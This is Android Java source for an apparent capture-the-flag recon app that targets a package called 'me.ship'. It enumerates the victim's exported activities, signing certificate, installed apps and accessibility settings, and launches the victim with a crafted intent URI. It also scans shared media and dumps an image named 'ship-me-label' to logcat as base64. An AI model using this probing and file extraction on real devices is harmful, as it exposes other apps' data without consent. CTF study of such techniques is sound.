package ctf.recon;

import android.app.Activity;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.widget.TextView;

import java.io.InputStream;
import java.io.ByteArrayOutputStream;
import java.security.MessageDigest;
import java.util.HashSet;
import java.util.Set;

/** Pure recon: describe the emulator, the installed packages and shared media. */
public class MainActivity extends Activity {

    private static final String T = "TFCCTF";
    private static final String VICTIM = "me.ship";
    private final Set<String> seenImages = new HashSet<String>();
    private int tick = 0;
    private boolean dumpedLabel = false;

    private static void say(String s) {
        try {
            if (s == null) s = "null";
            for (int i = 0; i < s.length(); i += 900) {
                Log.i(T, s.substring(i, Math.min(s.length(), i + 900)));
            }
        } catch (Throwable ignored) {
        }
    }

    private static String hex(byte[] b) {
        StringBuilder sb = new StringBuilder();
        for (byte x : b) sb.append(String.format("%02x", x));
        return sb.toString();
    }

    @Override
    protected void onCreate(Bundle b) {
        try {
            super.onCreate(b);
        } catch (Throwable ignored) {
        }
        try {
            TextView tv = new TextView(this);
            tv.setText("recon");
            setContentView(tv);
        } catch (Throwable ignored) {
        }
        say("=== recon alive t=" + System.currentTimeMillis() + " ===");
        say("device sdk=" + Build.VERSION.SDK_INT + " rel=" + Build.VERSION.RELEASE
                + " model=" + Build.MODEL + " fp=" + Build.FINGERPRINT);
        dumpIntent("onCreate", getIntent());
        dumpSelf();
        dumpVictim();
        dumpA11y();
        pokeVictim();
        scanImages();
        loop();
    }

    @Override
    protected void onNewIntent(Intent i) {
        try {
            super.onNewIntent(i);
            setIntent(i);
        } catch (Throwable ignored) {
        }
        dumpIntent("onNewIntent", i);
    }

    @SuppressWarnings("deprecation")
    private void dumpIntent(String w, Intent i) {
        try {
            if (i == null) { say(w + " intent=null"); return; }
            say(w + " uri=" + i.toUri(Intent.URI_INTENT_SCHEME));
            Bundle ex = i.getExtras();
            if (ex != null) for (String k : ex.keySet()) say(w + " extra " + k + " = " + ex.get(k));
        } catch (Throwable t) {
            say(w + " dump err " + t);
        }
    }

    private void dumpSelf() {
        try {
            PackageInfo pi = getPackageManager().getPackageInfo(
                    getPackageName(), PackageManager.GET_PERMISSIONS);
            if (pi.requestedPermissions != null) {
                for (int i = 0; i < pi.requestedPermissions.length; i++) {
                    boolean g = (pi.requestedPermissionsFlags[i]
                            & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0;
                    say("self perm " + pi.requestedPermissions[i] + " granted=" + g);
                }
            }
            say("self canDrawOverlays=" + Settings.canDrawOverlays(this));
        } catch (Throwable t) {
            say("dumpSelf err " + t);
        }
    }

    @SuppressWarnings("deprecation")
    private void dumpVictim() {
        try {
            PackageManager pm = getPackageManager();
            PackageInfo pi = pm.getPackageInfo(VICTIM,
                    PackageManager.GET_ACTIVITIES | PackageManager.GET_SIGNING_CERTIFICATES);
            ApplicationInfo ai = pi.applicationInfo;
            say("VICTIM INSTALLED: " + VICTIM + " vc=" + pi.getLongVersionCode()
                    + " uid=" + ai.uid
                    + " debuggable=" + ((ai.flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0)
                    + " targetSdk=" + ai.targetSdkVersion
                    + " dataDir=" + ai.dataDir);
            if (pi.activities != null) {
                for (android.content.pm.ActivityInfo a : pi.activities) {
                    say("  victim activity " + a.name + " exported=" + a.exported);
                }
            }
            if (pi.signingInfo != null) {
                Signature[] sigs = pi.signingInfo.getApkContentsSigners();
                for (Signature s : sigs) {
                    say("  victim cert sha256=" + hex(MessageDigest.getInstance("SHA-256")
                            .digest(s.toByteArray())));
                }
            }
        } catch (PackageManager.NameNotFoundException e) {
            say("VICTIM NOT INSTALLED: " + VICTIM);
        } catch (Throwable t) {
            say("dumpVictim err " + t);
        }
        try {
            int n = 0;
            StringBuilder sb = new StringBuilder("third-party pkgs:");
            for (ApplicationInfo ai : getPackageManager().getInstalledApplications(0)) {
                if ((ai.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    sb.append(' ').append(ai.packageName);
                    n++;
                }
            }
            say(sb + " (n=" + n + ")");
        } catch (Throwable t) {
            say("pkg list err " + t);
        }
    }

    private void dumpA11y() {
        try {
            ContentResolver cr = getContentResolver();
            say("a11y enabled=" + Settings.Secure.getString(cr,
                    Settings.Secure.ACCESSIBILITY_ENABLED)
                    + " services=" + Settings.Secure.getString(cr,
                    "enabled_accessibility_services"));
        } catch (Throwable t) {
            say("a11y err " + t);
        }
    }

    private void pokeVictim() {
        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName(VICTIM, VICTIM + ".MainActivity"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            i.putExtra("package", Uri.parse("shipme://cargo/?name=RECON_PROBE&origin=recon"));
            startActivity(i);
            say("poke: startActivity(me.ship/.MainActivity) OK");
        } catch (Throwable t) {
            say("poke failed " + t);
        }
    }

    private void scanImages() {
        try {
            ContentResolver cr = getContentResolver();
            String[] cols = {MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.RELATIVE_PATH,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.OWNER_PACKAGE_NAME};
            Cursor c = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, cols,
                    null, null, null);
            if (c == null) { say("image query returned null cursor"); return; }
            int n = 0;
            while (c.moveToNext()) {
                n++;
                String id = c.getString(0);
                String nm = c.getString(1);
                String rp = c.getString(2);
                String key = id + "/" + nm;
                if (seenImages.add(key)) {
                    say("IMAGE id=" + id + " name=" + nm + " path=" + rp
                            + " size=" + c.getString(3) + " owner=" + c.getString(4));
                }
                if (!dumpedLabel && nm != null && nm.startsWith("ship-me-label")) {
                    dumpedLabel = true;
                    dumpPng(Uri.withAppendedPath(
                            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id), nm);
                }
            }
            c.close();
            say("image scan done, rows=" + n);
        } catch (Throwable t) {
            say("scanImages err " + t);
        }
    }

    private void dumpPng(Uri u, String nm) {
        try {
            InputStream in = getContentResolver().openInputStream(u);
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            byte[] buf = new byte[8192];
            int r;
            while ((r = in.read(buf)) > 0) bo.write(buf, 0, r);
            in.close();
            byte[] png = bo.toByteArray();
            String b64 = Base64.encodeToString(png, Base64.NO_WRAP);
            say("PNGSTART " + nm + " bytes=" + png.length + " b64len=" + b64.length());
            int chunk = 800, idx = 0;
            for (int i = 0; i < b64.length(); i += chunk) {
                say("PNG" + (idx++) + ":" + b64.substring(i, Math.min(b64.length(), i + chunk)));
            }
            say("PNGEND " + nm);
        } catch (Throwable t) {
            say("dumpPng err " + t);
        }
    }

    private void loop() {
        final Handler h = new Handler(Looper.getMainLooper());
        h.postDelayed(new Runnable() {
            @Override
            public void run() {
                tick++;
                say("--- tick " + tick + " ---");
                scanImages();
                if (tick == 3) dumpVictim();
                if (tick < 60) h.postDelayed(this, 3000);
            }
        }, 3000);
    }
}
